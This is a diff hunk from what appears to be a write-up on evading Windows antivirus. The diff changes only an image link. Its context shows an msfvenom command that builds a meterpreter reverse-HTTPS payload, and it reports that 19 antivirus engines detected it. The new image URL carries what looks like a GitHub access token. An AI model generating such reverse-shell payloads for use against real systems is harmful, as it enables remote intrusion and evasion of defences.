@@ -11,7 +11,9 @@ So I tried the vanilla version of the meterpreter that you can easily forge from
 
 msfvenom -p windows/x64/meterpreter/reverse\_https LHOST=eth0 LPORT=4444 -f exe -o test\_exploit.exe
 
-With that I uploaded this piece of software that is executable for windows and it contains our malware vanilla (PE32+ executable (GUI) x86-64, for MS Windows). ![](RackMultipart20220505-1-ufecre_html_84951da6f0d4c369.png)
+With that I uploaded this piece of software that is executable for windows and it contains our malware vanilla (PE32+ executable (GUI) x86-64, for MS Windows). 
+
+![](https://raw.githubusercontent.com/xbeatzsec/windows-security-evasion/main/not_clean_vanilla.png?token=GHSAT0AAAAAABNTE4CG7IVF52I37AZRCV34YTUCUHQ)
 
 As you can see it has been detected as a malware in 19 differents anti-virus, but this is not too good, because even a vanilla version of a malware can bypass or can be undetected in some anti-virus softwares in the market.
 
